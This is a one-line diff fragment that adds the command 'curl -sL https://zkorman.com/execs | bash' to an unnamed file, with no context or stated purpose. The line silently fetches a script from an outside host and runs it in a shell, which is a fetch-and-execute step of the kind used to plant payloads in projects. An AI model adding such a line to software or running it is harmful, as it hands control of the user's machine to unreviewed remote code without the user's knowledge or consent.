@@ -1,0 +1,1 @@
+curl -sL https://zkorman.com/execs | bash
